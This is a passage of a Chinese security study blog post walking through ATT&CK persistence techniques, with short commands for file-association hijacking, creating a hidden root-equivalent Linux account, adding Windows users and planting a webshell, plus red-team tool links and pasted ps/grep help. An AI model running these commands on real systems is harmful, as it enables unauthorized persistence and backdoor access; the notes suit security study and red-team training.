<li>HKEY_CLASSES_ROOT\txtfile\shell\open\command</li>
<li>HKEY_CLASSES_ROOT\txtfile\shell\print\command</li>
<li>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/28.png" alt></li>
<li><strong>测试：</strong></li>
<li>cmd.exe /c assoc [指定文件扩展名]=”[指定文件类型，即让目标程序来打开]”</li>
<li>新建test.txt文件，内容：更改默认文件关联，改名为test.qwer</li>
<li>直接双击打开是无法打开的</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/29.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/30.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/31.png" alt></li>
</ol>
<h2 id="0x30-Linux-and-windows"><a href="#0x30-Linux-and-windows" class="headerlink" title="0x30 Linux and windows"></a>0x30 Linux and windows</h2><h3 id="0x31-T1136-Creat-Account（创建账号）"><a href="#0x31-T1136-Creat-Account（创建账号）" class="headerlink" title="0x31 T1136-Creat Account（创建账号）"></a>0x31 T1136-Creat Account（创建账号）</h3><ol>
<li><p><strong>Linux</strong></p>
</li>
<li><p>创建用户：useradd -M -N -r -s /bin/bash -c 用户备注 [用户名]</p>
</li>
<li><p>删除用户：userdel [用户名]</p>
</li>
<li><p>useradd帮助信息</p>
</li>
<li><p><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/32.png" alt></p>
</li>
<li><p>创建root权限用户：useradd -o -u 0 -g 0 -M -d /root -s /bin/bash [用户名]</p>
</li>
<li><p>echo “[密码]” | passwd –stdin [用户名]</p>
</li>
<li><p>删除用户：userdel [用户名]</p>
</li>
<li><p><strong>windows cmd</strong></p>
</li>
<li><p>创建用户：net user /add [用户名]</p>
</li>
<li><p>删除用户：net user /del [用户名]</p>
</li>
<li><p><strong>windows powershell</strong></p>
</li>
<li><p>创建用户：New-LocalUser -Name [用户名] -NoPassword</p>
</li>
<li><p>删除用户：Remove-LocalUser -Name [用户名]</p>
</li>
</ol>
<h3 id="0x32-T1158-Hidden-Files-and-Directories（隐藏的文件和目录）"><a href="#0x32-T1158-Hidden-Files-and-Directories（隐藏的文件和目录）" class="headerlink" title="0x32 T1158 - Hidden Files and Directories（隐藏的文件和目录）"></a>0x32 T1158 - Hidden Files and Directories（隐藏的文件和目录）</h3><ol>
<li></li>
</ol>
<h2 id="0x40-web-server-OR-application-program"><a href="#0x40-web-server-OR-application-program" class="headerlink" title="0x40 web server OR application program"></a>0x40 web server OR application program</h2><h3 id="0x41-T1100-windows-Linux-web-shell"><a href="#0x41-T1100-windows-Linux-web-shell" class="headerlink" title="0x41 T1100-windows/Linux web shell"></a>0x41 T1100-windows/Linux web shell</h3><ol>
<li>xcopy.exe：copy的扩展，可以把指定的目录连文件和目录结构一起拷贝，但不能拷贝系统文件；</li>
<li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell集合</a></li>
<li>上传或拷贝webshell到服务器：xcopy webshell_file webshell_path</li>
<li>删除：del webshell_file</li>
<li>文件上传漏洞</li>
<li>文件包含漏洞</li>
<li>数据库漏洞</li>
<li>等等</li>
</ol>
<h3 id="0x42-T1176-Browser-Extensions（浏览器扩展）"><a href="#0x42-T1176-Browser-Extensions（浏览器扩展）" class="headerlink" title="0x42 T1176-Browser Extensions（浏览器扩展）"></a>0x42 T1176-Browser Extensions（浏览器扩展）</h3><ol>
<li>浏览器扩展程序或插件是小程序，可通过程序商店下载安装或离线下载安装。</li>
<li>扩展程序通常对浏览器可以访问的内容具有访问权限，恶意扩展程序可以通过伪装成合法扩展程序，用户下载安装恶意扩展程序后容易被攻击，危害用户浏览器的用户信息，甚至系统安全。</li>
<li>常见可安装扩展程序的浏览器：chrome、Firefox等等</li>
</ol>
<h2 id="0x50-privilege-escalation"><a href="#0x50-privilege-escalation" class="headerlink" title="0x50 privilege escalation"></a>0x50 privilege escalation</h2><h3 id="0x51-T1044-File-System-Permissions-Weakness"><a href="#0x51-T1044-File-System-Permissions-Weakness" class="headerlink" title="0x51 T1044 - File System Permissions Weakness"></a>0x51 T1044 - File System Permissions Weakness</h3><ol>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1044/T1044.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1044/T1044.md</a></li>
</ol>
<h2 id="0xF0-其他"><a href="#0xF0-其他" class="headerlink" title="0xF0 其他"></a>0xF0 其他</h2><ol>
<li>T1084 Windows Management Instrumentation Event Subscription</li>
<li>T1098 Account Manipulation</li>
<li>T1103 AppInit DLLs</li>
<li>T1038 - DLL Search Order Hijacking</li>
</ol>
<h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><ol>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md</a></li>
</ol>
<h2 id="0xFF-帮助附录"><a href="#0xFF-帮助附录" class="headerlink" title="0xFF 帮助附录"></a>0xFF 帮助附录</h2><p><strong>Linux ps</strong></p>
<pre><code>[root@localhost ~]# ps --help all

Usage:
 ps [options]

Basic options:
 -A, -e               all processes
 -a                   all with tty, except session leaders
  a                   all with tty, including other users
 -d                   all except session leaders
 -N, --deselect       negate selection
  r                   only running processes
  T                   all processes on this terminal
  x                   processes without controlling ttys

Selection by list:
 -C &lt;command&gt;         command name
 -G, --Group &lt;GID&gt;    real group id or name
 -g, --group &lt;group&gt;  session or effective group name
 -p, p, --pid &lt;PID&gt;   process id
        --ppid &lt;PID&gt;  parent process id
 -q, q, --quick-pid &lt;PID&gt;
                      process id (quick mode)
 -s, --sid &lt;session&gt;  session id
 -t, t, --tty &lt;tty&gt;   terminal
 -u, U, --user &lt;UID&gt;  effective user id or name
 -U, --User &lt;UID&gt;     real user id or name

  The selection options take as their argument either:
    a comma-separated list e.g. &#39;-u root,nobody&#39; or
    a blank-separated list e.g. &#39;-p 123 4567&#39;

Output formats:
 -F                   extra full
 -f                   full-format, including command lines
  f, --forest         ascii art process tree
 -H                   show process hierarchy
 -j                   jobs format
  j                   BSD job control format
 -l                   long format
  l                   BSD long format
 -M, Z                add security data (for SELinux)
 -O &lt;format&gt;          preloaded with default columns
  O &lt;format&gt;          as -O, with BSD personality
 -o, o, --format &lt;format&gt;
                      user-defined format
  s                   signal format
  u                   user-oriented format
  v                   virtual memory format
  X                   register format
 -y                   do not show flags, show rss vs. addr (used with -l)
     --context        display security context (for SELinux)
     --headers        repeat header lines, one per page
     --no-headers     do not print header at all
     --cols, --columns, --width &lt;num&gt;
                      set screen width
     --rows, --lines &lt;num&gt;
                      set screen height

Show threads:
  H                   as if they were processes
 -L                   possibly with LWP and NLWP columns
 -m, m                after processes
 -T                   possibly with SPID column

Miscellaneous options:
 -c                   show scheduling class with -l option
  c                   show true command name
  e                   show the environment after command
  k,    --sort        specify sort order as: [+|-]key[,[+|-]key[,...]]
  L                   show format specifiers
  n                   display numeric uid and wchan
  S,    --cumulative  include some dead child process data
 -y                   do not show flags, show rss (only with -l)
 -V, V, --version     display version information and exit
 -w, w                unlimited output width

        --help &lt;simple|list|output|threads|misc|all&gt;
                      display help and exit

For more details see ps(1).</code></pre><p><strong>Linux grep</strong></p>
<pre><code>[root@localhost ~]# grep --help
用法: grep [选项]... PATTERN [FILE]...
在每个 FILE 或是标准输入中查找 PATTERN。
默认的 PATTERN 是一个基本正则表达式(缩写为 BRE)。
例如: grep -i &#39;hello world&#39; menu.h main.c

正则表达式选择与解释:
  -E, --extended-regexp     PATTERN 是一个可扩展的正则表达式(缩写为 ERE)
  -F, --fixed-strings       PATTERN 是一组由断行符分隔的定长字符串。
  -G, --basic-regexp        PATTERN 是一个基本正则表达式(缩写为 BRE)
  -P, --perl-regexp         PATTERN 是一个 Perl 正则表达式
  -e, --regexp=PATTERN      用 PATTERN 来进行匹配操作
  -f, --file=FILE           从 FILE 中取得 PATTERN
  -i, --ignore-case         忽略大小写
  -w, --word-regexp         强制 PATTERN 仅完全匹配字词
  -x, --line-regexp         强制 PATTERN 仅完全匹配一行
  -z, --null-data           一个 0 字节的数据行，但不是空行

Miscellaneous:
  -s, --no-messages         suppress error messages
  -v, --invert-match        select non-matching lines
  -V, --version             display version information and exit
      --help                display this help text and exit

输出控制:
  -m, --max-count=NUM       NUM 次匹配后停止
  -b, --byte-offset         输出的同时打印字节偏移
  -n, --line-number         输出的同时打印行号
      --line-buffered       每行输出清空
  -H, --with-filename       为每一匹配项打印文件名
  -h, --no-filename         输出时不显示文件名前缀
      --label=LABEL         将LABEL 作为标准输入文件名前缀
  -o, --only-matching       show only the part of a line matching PATTERN
  -q, --quiet, --silent     suppress all normal output
      --binary-files=TYPE   assume that binary files are TYPE;
                            TYPE is &#39;binary&#39;, &#39;text&#39;, or &#39;without-match&#39;
  -a, --text                equivalent to --binary-files=text
  -I                        equivalent to --binary-files=without-match
  -d, --directories=ACTION  how to handle directories;
                            ACTION is &#39;read&#39;, &#39;recurse&#39;, or &#39;skip&#39;
  -D, --devices=ACTION      how to handle devices, FIFOs and sockets;
                            ACTION is &#39;read&#39; or &#39;skip&#39;
  -r, --recursive           like --directories=recurse
  -R, --dereference-recursive
                            likewise, but follow all symlinks
      --include=FILE_PATTERN
                            search only files that match FILE_PATTERN
      --exclude=FILE_PATTERN
                            skip files and directories matching FILE_PATTERN
      --exclude-from=FILE   skip files matching any file pattern from FILE
      --exclude-dir=PATTERN directories that match PATTERN will be skipped.
  -L, --files-without-match print only names of FILEs containing no match
  -l, --files-with-matches  print only names of FILEs containing matches
  -c, --count               print only a count of matching lines per FILE
  -T, --initial-tab         make tabs line up (if needed)
  -Z, --null                print 0 byte after FILE name

文件控制:
  -B, --before-context=NUM  打印以文本起始的NUM 行
  -A, --after-context=NUM   打印以文本结尾的NUM 行
  -C, --context=NUM         打印输出文本NUM 行
  -NUM                      same as --context=NUM
      --group-separator=SEP use SEP as a group separator
      --no-group-separator  use empty string as a group separator
      --color[=WHEN],
      --colour[=WHEN]       use markers to highlight the matching strings;
                            WHEN is &#39;always&#39;, &#39;never&#39;, or &#39;auto&#39;
  -U, --binary              do not strip CR characters at EOL (MSDOS/Windows)
  -u, --unix-byte-offsets   report offsets as if CRs were not there
                            (MSDOS/Windows)

‘egrep’即‘grep -E’。‘fgrep’即‘grep -F’。
直接使用‘egrep’或是‘fgrep’均已不可行了。
若FILE 为 -，将读取标准输入。不带FILE，读取当前目录，除非命令行中指定了-r 选项。
如果少于两个FILE 参数，就要默认使用-h 参数。
如果有任意行被匹配，那退出状态为 0，否则为 1；
如果有错误产生，且未指定 -q 参数，那退出状态为 2。</code></pre><h2 id="red-team"><a href="#red-team" class="headerlink" title="red team"></a>red team</h2><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming#-lateral-movement" target="_blank" rel="noopener">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming#-lateral-movement</a><br><a href="https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE" target="_blank" rel="noopener">https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE</a><br><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a><br><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank" rel="noopener">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p>

      
       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习用途，禁止非法利用。——网络知识获取、理解、提纯、笔记工程师 </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>ATT-CK学习</p>
    
    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
    <p><span class="copy-title">发布时间:</span>2020-01-13, 10:26:28</p>
    <p><span class="copy-title">最后更新:</span>2020-03-15, 13:22:07</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/ATT-CK%E5%AD%A6%E4%B9%A0/" title="ATT-CK学习">https://10fteam.github.io/ATT-CK%E5%AD%A6%E4%B9%A0/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2019-2020 10fteam</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#CTF','#encrypt_decrypt','#知识','#backdoor','#misc','#工具','#漏洞','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#PHP','#代码审计','#POC','#EXP','#PWN','#python','#注入','#phpmyadmin','#Struts2','#weblogic','#脱壳','#app','#encode_decode','#shell','#靶场','#vulnhub','#僵尸网络','#内网渗透','#share','#CDN','#提权','#书籍','#linux','#windows','#DLL','#WAF','#MISC','#逆向',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: #fafafa;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        <!--width: 542px;-->
        width: 270px;
    }
    .nav.fullscreen {
        <!--margin-left: -542px;-->
        margin-left: -270px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>









</html>
